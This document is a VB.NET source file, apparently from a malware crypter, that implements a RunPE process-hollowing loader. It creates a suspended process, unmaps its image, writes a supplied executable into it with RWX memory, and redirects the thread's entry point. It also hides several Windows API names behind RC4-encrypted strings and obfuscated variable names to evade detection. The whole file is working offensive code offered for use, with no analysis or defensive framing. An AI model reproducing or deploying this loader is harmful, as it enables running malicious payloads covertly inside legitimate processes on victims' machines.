Imports System.Runtime.InteropServices
Imports System.Text




' Credits to: felicixus, pr0t0typ3 and aeonhack

Public Class psrun
    Public Class makeapi
        Enum flagginglib As UInteger
            DONT_RESOLVE_DLL_REFERENCES = &H1
            LOAD_IGNORE_CODE_AUTHZ_LEVEL = &H10
            LOAD_LIBRARY_AS_DATAFILE = &H2
            LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = &H40
            LOAD_LIBRARY_AS_IMAGE_RESOURCE = &H20
            LOAD_WITH_ALTERED_SEARCH_PATH = &H8
        End Enum
        Shared Function rc4(ByVal tgIdqYlTptZIYySGkIfl As String, ByVal hsvKghrWvMoOcupfKZXA As String) As String
            Dim NAkhTayqmyFeznwXFsub As Integer = 0
            Dim SlGZgrJMHyawvBYVPHmH As Integer = hsvKghrWvMoOcupfKZXA.Length
            Dim HVBCaKTKpREAVNDpYwhF As Integer() = New Integer(256) {}
            Dim LunuMzlEYOzMEgSJWCJR As New StringBuilder
            Dim ZfwwZXdWiJbOGhpfKUIY As Integer = 0
            Dim OazalfxhTnyTWJdrzWLi As Integer = 0
            Dim AKucfzcguranHHowPlYk As Integer = 0
            Dim DaLPwiLgsIoUrvVLOEXS As String = String.Empty
            Dim ggIDcYNTbtUtqkRWBISB As Integer = 0
            Dim nPinkvyGjktTycrKexsh As Integer() = New Integer(256) {}
            While NAkhTayqmyFeznwXFsub <= 255
                Dim uWPxdmnlqGXcUZAimogU As Char = (hsvKghrWvMoOcupfKZXA.Substring((NAkhTayqmyFeznwXFsub Mod SlGZgrJMHyawvBYVPHmH), 1).ToCharArray()(0))
                nPinkvyGjktTycrKexsh(NAkhTayqmyFeznwXFsub) = NAkhTayqmyFeznwXFsub
                HVBCaKTKpREAVNDpYwhF(NAkhTayqmyFeznwXFsub) = Microsoft.VisualBasic.Strings.Asc(uWPxdmnlqGXcUZAimogU)
                System.Math.Max(System.Threading.Interlocked.Increment(NAkhTayqmyFeznwXFsub), NAkhTayqmyFeznwXFsub - 1)
            End While
            While OazalfxhTnyTWJdrzWLi <= 255
                AKucfzcguranHHowPlYk = (AKucfzcguranHHowPlYk + nPinkvyGjktTycrKexsh(OazalfxhTnyTWJdrzWLi) + HVBCaKTKpREAVNDpYwhF(OazalfxhTnyTWJdrzWLi)) Mod 256
                Dim cUOouGVJrmnlqbipUhgw As Integer = nPinkvyGjktTycrKexsh(OazalfxhTnyTWJdrzWLi)
                nPinkvyGjktTycrKexsh(OazalfxhTnyTWJdrzWLi) = nPinkvyGjktTycrKexsh(AKucfzcguranHHowPlYk)
                nPinkvyGjktTycrKexsh(AKucfzcguranHHowPlYk) = cUOouGVJrmnlqbipUhgw
                System.Math.Max(System.Threading.Interlocked.Increment(OazalfxhTnyTWJdrzWLi), OazalfxhTnyTWJdrzWLi - 1)
            End While
            NAkhTayqmyFeznwXFsub = 1
            While NAkhTayqmyFeznwXFsub <= tgIdqYlTptZIYySGkIfl.Length
                Dim VxiyRYwVydGLxZPzGNII As Integer = 0
                ggIDcYNTbtUtqkRWBISB = (ggIDcYNTbtUtqkRWBISB + 1) Mod 256
                ZfwwZXdWiJbOGhpfKUIY = (ZfwwZXdWiJbOGhpfKUIY + nPinkvyGjktTycrKexsh(ggIDcYNTbtUtqkRWBISB)) Mod 256
                VxiyRYwVydGLxZPzGNII = nPinkvyGjktTycrKexsh(ggIDcYNTbtUtqkRWBISB)
                nPinkvyGjktTycrKexsh(ggIDcYNTbtUtqkRWBISB) = nPinkvyGjktTycrKexsh(ZfwwZXdWiJbOGhpfKUIY)
                nPinkvyGjktTycrKexsh(ZfwwZXdWiJbOGhpfKUIY) = VxiyRYwVydGLxZPzGNII
                Dim mogUiHKshEsjxOqpddYH As Integer = nPinkvyGjktTycrKexsh((nPinkvyGjktTycrKexsh(ggIDcYNTbtUtqkRWBISB) + nPinkvyGjktTycrKexsh(ZfwwZXdWiJbOGhpfKUIY)) Mod 256)
                Dim MECWMqRqoiWxXTFCSctu As Char = tgIdqYlTptZIYySGkIfl.Substring(NAkhTayqmyFeznwXFsub - 1, 1).ToCharArray()(0)
                VxiyRYwVydGLxZPzGNII = Asc(MECWMqRqoiWxXTFCSctu)
                Dim DSbyfPNYKemcORTEIrls As Integer = VxiyRYwVydGLxZPzGNII Xor mogUiHKshEsjxOqpddYH
                LunuMzlEYOzMEgSJWCJR.Append(Chr(DSbyfPNYKemcORTEIrls))
                System.Math.Max(System.Threading.Interlocked.Increment(NAkhTayqmyFeznwXFsub), NAkhTayqmyFeznwXFsub - 1)
            End While
            DaLPwiLgsIoUrvVLOEXS = LunuMzlEYOzMEgSJWCJR.ToString
            LunuMzlEYOzMEgSJWCJR.Length = 0
            Return DaLPwiLgsIoUrvVLOEXS
        End Function
        Declare Function LoadLibraryExA Lib "kernel32" (ByVal uno As String, ByVal due As IntPtr, ByVal cinque As flagginglib) As IntPtr
        Declare Function GetProcAddress Lib "kernel32" (ByVal tre As IntPtr, ByVal quattro As String) As IntPtr
        Shared Function makemake(Of obj)(ByVal plib As String, ByVal pfunc As String) As obj
            Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryExA(plib, CType(0, IntPtr), flagginglib.LOAD_LIBRARY_AS_DATAFILE), pfunc), GetType(obj)), Object), obj)
        End Function
    End Class

    Delegate Function CreateProcess(ByVal appName As String, ByVal commandLine As StringBuilder, ByVal procAttr As IntPtr, ByVal thrAttr As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal inherit As Boolean, ByVal creation As Integer, _
  ByVal env As IntPtr, ByVal curDir As String, ByVal sInfo As Byte(), ByVal pInfo As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean


    Delegate Function getthrcontx(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean


    Delegate Function nunmpsctn(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr) As UInteger


    Delegate Function rdprocssmr(ByVal hProc As IntPtr, ByVal baseAddr As IntPtr, ByRef bufr As IntPtr, ByVal bufrSize As Integer, ByRef numRead As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean


    Delegate Function resmthrd(ByVal hThread As IntPtr) As UInteger


    Delegate Function strthd(ByVal hThr As IntPtr, ByVal ctxt As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean


    Delegate Function vrtall(ByVal hProc As IntPtr, ByVal addr As IntPtr, ByVal size As IntPtr, ByVal allocType As Integer, ByVal prot As Integer) As IntPtr

    Public Shared Function runexe(ByVal pByteArray As Byte(), ByVal pProcess0Injectto As String) As Boolean
        Try
            Dim num2 As Integer = BitConverter.ToInt32(pByteArray, 60)
            Dim resm As resmthrd = makeapi.makemake(Of resmthrd)("kernel32", "ResumeThread")
            Dim processInfo As IntPtr() = New IntPtr(3) {}
            Dim startupInfo As Byte() = New Byte(67) {}

            Dim crt As CreateProcess = makeapi.makemake(Of CreateProcess)("kernel32", makeapi.rc4("MŒuÖÈvÒö˜þe(„", "junkst"))


            Dim num As Integer = BitConverter.ToInt16(pByteArray, num2 + 6)
            Dim ptr4 As New IntPtr(BitConverter.ToInt32(pByteArray, num2 + &H54))
            Dim gettr As getthrcontx = makeapi.makemake(Of getthrcontx)(makeapi.rc4("p¨°Þ2dí", "pass1"), makeapi.rc4("\¨¶ä?2¾ÑÆ-f1©", "pass1"))
            Dim procAttr As IntPtr = IntPtr.Zero


            If crt(Nothing, New StringBuilder(pProcess0Injectto), procAttr, procAttr, False, 4, _
            procAttr, Nothing, startupInfo, processInfo) Then
                Dim ctxt As UInteger() = New UInteger(178) {}
                ctxt(0) = &H10002
                If gettr(processInfo(1), ctxt) Then
                    Dim baseAddr As New IntPtr(ctxt(&H29) + 8L)

                    Dim buffer__1 As IntPtr = IntPtr.Zero
                    Dim bufferSize As New IntPtr(4)

                    Dim numRead As IntPtr = IntPtr.Zero
                    Dim nunmap As nunmpsctn = makeapi.makemake(Of nunmpsctn)("ntdll", "NtUnmapViewOfSection")
                    Dim readprcsmmry As rdprocssmr = makeapi.makemake(Of rdprocssmr)("kernel32", makeapi.rc4("¥Õ lÕß‘Ò7ìâè·ÞîÕ", "pass"))

                    If readprcsmmry(processInfo(0), baseAddr, buffer__1, CInt(bufferSize), numRead) AndAlso (nunmap(processInfo(0), buffer__1) = 0) Then
                        Dim addr As New IntPtr(BitConverter.ToInt32(pByteArray, num2 + &H34))
                        Dim size As New IntPtr(BitConverter.ToInt32(pByteArray, num2 + 80))
                        Dim vrtal As vrtall = makeapi.makemake(Of vrtall)("kernel32", "VirtualAllocEx")
                        Dim lpBaseAddress As IntPtr = vrtal(processInfo(0), addr, size, &H3000, &H40)

                        Dim lpNumberOfBytesWritten As Integer
                        Dim wrt As wrtproc = makeapi.makemake(Of wrtproc)("kernel32", makeapi.rc4("aúþìÍ;zä®º2mó¹ý", "junks"))

                        wrt(processInfo(0), lpBaseAddress, pByteArray, CUInt(CInt(ptr4)), lpNumberOfBytesWritten)
                        Dim num5 As Integer = num - 1
                        For i As Integer = 0 To num5
                            Dim dst As Integer() = New Integer(9) {}
                            Buffer.BlockCopy(pByteArray, (num2 + &HF8) + (i * 40), dst, 0, 40)
                            Dim buffer2 As Byte() = New Byte((dst(4) - 1)) {}
                            Buffer.BlockCopy(pByteArray, dst(5), buffer2, 0, buffer2.Length)

                            size = New IntPtr(lpBaseAddress.ToInt32() + dst(3))
                            addr = New IntPtr(buffer2.Length)

                            wrt(processInfo(0), size, buffer2, CUInt(addr), lpNumberOfBytesWritten)
                        Next
                        size = New IntPtr(ctxt(&H29) + 8L)
                        addr = New IntPtr(4)

                        wrt(processInfo(0), size, BitConverter.GetBytes(lpBaseAddress.ToInt32()), CUInt(addr), lpNumberOfBytesWritten)
                        ctxt(&H2C) = CUInt(lpBaseAddress.ToInt32() + BitConverter.ToInt32(pByteArray, num2 + 40))

                        Dim sethre As strthd = makeapi.makemake(Of strthd)("kernel32", "SetThreadContext")

                        sethre(processInfo(1), ctxt)
                    End If
                End If

                resm(processInfo(1))
            End If
        Catch
            Return False
        End Try
        Return True
    End Function


    Delegate Function wrtproc(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr, ByVal lpBuffer As Byte(), ByVal nSize As UInteger, ByVal lpNumberOfBytesWritten As Integer) As Boolean



End Class